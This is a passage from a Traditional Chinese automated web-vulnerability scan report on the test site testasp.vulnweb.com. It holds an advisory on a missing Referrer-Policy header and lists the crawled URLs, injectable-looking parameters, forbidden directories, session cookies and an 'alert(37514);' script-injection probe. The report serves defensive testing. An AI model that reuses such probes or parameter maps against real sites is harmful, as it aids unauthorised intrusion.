/></div><div class="h2group" id="attReferrerPolicyHeaderExist" xmlns=""><h2>遺漏「查閱者原則」安全標頭</h2><a name="attReferrerPolicyHeaderExist_Adv"></a><a class="toclink" href="#toc">目錄</a></div><div class="noPageBreak" xmlns=""><h4>原因：</h4><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><li>不安全的 Web 應用程式程式設計或設定</li></ul></div><div class="noPageBreak" xmlns=""><h4>風險：</h4><ul style="padding-left: 1.2em; margin-top:0"><div>有可能收集有關 Web 應用程式的機密資訊，例如使用者名稱、密碼、機器名稱和/或機密檔案位置</div><div>有可能說服天真的使用者提供機密資訊，例如使用者名稱、密碼、信用卡號碼、社會安全碼等等</div><div>查閱者原則的值缺少或不適當可能會導致 URL 洩漏，即使是 URL 中所含的機密資訊，都會向跨網站洩漏。</div><div>這是一部分的規則集，可檢查是否設有查閱者原則，若有的話可以測試其設定。「查閱者原則」標頭會在查閱者標頭中定義可提供的資料，並且在目的地的 (document.referrer) 定義導覽和 iframe。此標頭的設計是為了要修改瀏覽器呈現頁面的方式，藉此避免跨網域的查閱者洩漏。正確設定標頭值很重要，設定方式不要妨礙網站的正常運作。</div><div>查閱者標頭是一個要求標頭，可表示流量來自哪個網站。如果沒有設有適當的防護，URL 本身，甚至是包含在 URL 中的機密資訊，都會向跨網站洩漏。</div><div></div><div>「no-referrer-when-downgrade」和「unsafe-url」是會洩露第三方網站完整 URL 的原則。剩餘的原則為「no-referrer」、「origin」、「origin-when-cross-origin」、「same-origin」、「strict-origin」、「strict-origin-when-cross-origin」。</div><div></div><div>詳情請參閱下方連結。</div></ul></div><div class="noPageBreak" xmlns=""><h4>受影響的產品：</h4><ul style="&#xA;							list-style: none; padding-left: 0; margin-top:0;&#xA;						"><div>此問題可能會影響不同類型的產品</div></ul></div><div class="noPageBreak" xmlns=""><h4>修正建議：</h4><h5>一般</h5><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><div>設定伺服器以傳送「查閱者原則」標頭。</div><div>建議透過查閱者原則標頭的目錄安全值，設定查閱者原則標頭。如下所示：</div><div>"strict-origin-when-cross-origin" 提供更高的隱私權。有了此原則，只有來源會在跨來源要求的查閱者標頭中傳送。</div><div></div><div>如果是 Google Chrome，請參閱： </div><a href="https://developers.google.com/web/updates/2020/07/referrer-policy-new-chrome-default">https://developers.google.com/web/updates/2020/07/referrer-policy-new-chrome-default</a><br /><div>如果是 Firefox，請參閱： </div><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy.">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy.</a><br /></ul></div><div class="noPageBreak" xmlns=""><h4>CWE：</h4><a href="http://cwe.mitre.org/data/definitions/200.html">200</a><br /><a href="http://cwe.mitre.org/data/definitions/664.html">664</a><br /><a href="http://cwe.mitre.org/data/definitions/668.html">668</a><br /></div><div class="noPageBreak" xmlns=""><h4>外部參照：</h4><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy">MDN web 文件 - 查閱者原則</a><br /></div>
           
          
          <input type="hidden" name="sectionstart" />
           
          
          <h1 id="applicationData"><a name="applicationData"></a>應用程式資料</h1><div id="visitedLinks" class="h2group" xmlns=""><h2>造訪的 URL<span class="count">7</span></h2><a name="visitedLinks"></a><a class="toclink" href="#toc">目錄</a></div><div class="datatable" xmlns=""><div class="th">URL</div><div class="td">http://testasp.vulnweb.com/</div><div class="td">http://testasp.vulnweb.com/Templatize.asp?item=html/about.html</div><div class="td">http://testasp.vulnweb.com/Search.asp</div><div class="td">http://testasp.vulnweb.com/Search.asp?tfSearch=</div><div class="td">http://testasp.vulnweb.com/showthread.asp?id=0</div><div class="td">http://testasp.vulnweb.com/showthread.asp?id=1</div><div class="td">http://testasp.vulnweb.com/_vti_cnf/</div></div><div id="parameters" class="h2group" xmlns=""><h2>參數<span class="count">3</span></h2><a name="parameters"></a><a class="toclink" href="#toc">目錄</a></div><table class="datatable" xmlns=""><tr><th>名稱</th><th>值</th><th>URL</th><th>類型</th></tr><tr><td class="breakNormal">id</td><td><div>0</div><div>1</div></td><td>http://testasp.vulnweb.com/showthread.asp?id=0</td><td class="nowordwrap">簡式鏈結</td></tr><tr><td class="breakNormal">item</td><td><div>html/about.html</div></td><td>http://testasp.vulnweb.com/Templatize.asp?item=html/about.html</td><td class="nowordwrap">簡式鏈結</td></tr><tr><td class="breakNormal">tfSearch</td><td></td><td>http://testasp.vulnweb.com/Search.asp?tfSearch=</td><td class="nowordwrap">文字</td></tr></table><div id="brokenLinks" class="h2group" xmlns=""><h2>失敗要求<span class="count">5</span></h2><a name="brokenLinks"></a><a class="toclink" href="#toc">目錄</a></div><table class="datatable" xmlns=""><tr><th>URL</th><th>原因</th></tr><tr><td>http://testasp.vulnweb.com/cgi-bin/</td><td class="nowordwrap">回應狀態 '403' - 禁止</td></tr><tr><td>http://testasp.vulnweb.com/html/</td><td class="nowordwrap">回應狀態 '403' - 禁止</td></tr><tr><td>http://testasp.vulnweb.com/images/</td><td class="nowordwrap">回應狀態 '403' - 禁止</td></tr><tr><td>http://testasp.vulnweb.com/templates/</td><td class="nowordwrap">回應狀態 '403' - 禁止</td></tr><tr><td>http://testasp.vulnweb.com/aspnet_client/</td><td class="nowordwrap">回應狀態 '403' - 禁止</td></tr></table><div id="comments" class="h2group" xmlns=""><h2>註解<span class="count">7</span></h2><a name="comments"></a><a class="toclink" href="#toc">目錄</a></div><table class="datatable tablelayoutfixed" xmlns=""><tr class="commentsheader"><th>URL</th><th>註解</th></tr><tr><td>http://testasp.vulnweb.com/</td><td class="nowordwrap" style="white-space: pre-wrap;">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;</td></tr><tr><td>http://testasp.vulnweb.com/</td><td class="nowordwrap" style="white-space: pre-wrap;">InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false"</td></tr><tr><td>http://testasp.vulnweb.com/</td><td class="nowordwrap" style="white-space: pre-wrap;">InstanceBeginEditable name="doctitle"</td></tr><tr><td>http://testasp.vulnweb.com/</td><td class="nowordwrap" style="white-space: pre-wrap;">InstanceEndEditable</td></tr><tr><td>http://testasp.vulnweb.com/</td><td class="nowordwrap" style="white-space: pre-wrap;">InstanceBeginEditable name="head"</td></tr><tr><td>http://testasp.vulnweb.com/</td><td class="nowordwrap" style="white-space: pre-wrap;">InstanceBeginEditable name="MainContentLeft"</td></tr><tr><td>http://testasp.vulnweb.com/</td><td class="nowordwrap" style="white-space: pre-wrap;">InstanceEnd</td></tr></table><div id="javaScripts" class="h2group" xmlns=""><h2>JavaScript<span class="count">1</span></h2><a name="javaScripts"></a><a class="toclink" href="#toc">目錄</a></div><div class="datatable" xmlns=""><div class="th">URL
				/
				程式碼</div><div>http://testasp.vulnweb.com/showthread.asp</div><div class="code">alert(37514);</div></div><div id="cookies" class="h2group" xmlns=""><h2>Cookie<span class="count">2</span></h2><a name="cookies"></a><a class="toclink" href="#toc">目錄</a></div><table class="datatable" xmlns=""><tr class="cookiesheader"><th>名稱</th><th>第一個集合</th><th>網域</th><th>安全</th><th>僅限 HTTP</th><th>相同網站</th><th>JS 堆疊追蹤</th></tr><tr><th>值</th><th>所要求的 URL</th><th> </th><th>到期</th><th> </th><th> </th><th> </th></tr><tr><td>ASPSESSIONIDQQQQQDST</td><td>http://testasp.vulnweb.com/_vti_cnf/</td><td>testasp.vulnweb.com</td><td>False</td><td>False</td><td></td><td></td></tr><tr class="double"><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>ASPSESSIONIDSQRQRDTS</td><td>http://testasp.vulnweb.com/</td><td>testasp.vulnweb.com</td><td>False</td><td>False</td><td></td><td></td></tr><tr class="double"><td>GINCJHPAIGHENGIPCLJFHOGA</td><td>http://testasp.vulnweb.com/Templatize.asp?item=html/about.html</td><td></td><td></td><td></td><td></td><td></td></tr></table></body></html>